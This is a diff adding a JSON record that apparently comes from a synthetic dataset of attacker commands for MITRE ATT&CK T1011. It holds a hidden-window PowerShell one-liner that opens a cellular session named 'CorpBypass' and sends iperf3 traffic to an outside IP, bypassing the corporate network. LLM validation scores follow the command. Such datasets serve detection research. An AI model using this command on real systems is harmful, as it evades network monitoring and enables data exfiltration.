@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh mbn connect interface=\"Cellular\" connmode=name name=\"CorpBypass\" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 100.72.55.9 -p 53433 -B $ip -t 60\"",
+  "explanation": "Establishes a mobile broadband session and binds iperf3 to the Cellular interface, exfiltrating via cellular data instead of enterprise LAN (T1011).",
+  "rationale_steps": [
+    "Initiate a mobile broadband connection to enable the cellular medium.",
+    "Resolve the cellular interface IP address.",
+    "Bind iperf3 to that IP on an uncommon port for data egress.",
+    "Execute hidden to reduce casual observation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-f87300ae",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with correct quoting, separators, variable assignments, and valid parameter usage for netsh, Get-NetAdapter, Get-NetIPAddress, and Start-Process.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly connects and binds traffic to the cellular interface and sends data to a remote host, demonstrating use of an alternate medium, though iperf3 sends test traffic rather than actual data exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:50:53.957856Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax including balanced quotes, correct pipe operators, error handling with -ErrorAction parameter, and proper command chaining with semicolons.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1011 by establishing a cellular connection outside the monitored network, retrieving the cellular interface's IP address, and using iperf3 to exfiltrate data through that interface to a remote server on a non-standard port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:50:57.208896Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, valid parameters for all cmdlets, and proper command separation.",
+        "semantic_score": 3,
+        "semantic_justification": "The command's logic correctly targets T1011 by attempting to establish a cellular connection and explicitly binding iperf3 traffic to that interface; however, the stated 'Privilege: None' for `netsh mbn connect` makes the critical first step operationally implausible, preventing the full claimed intent from being achieved under standard Windows configurations.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T06:18:39.908504Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
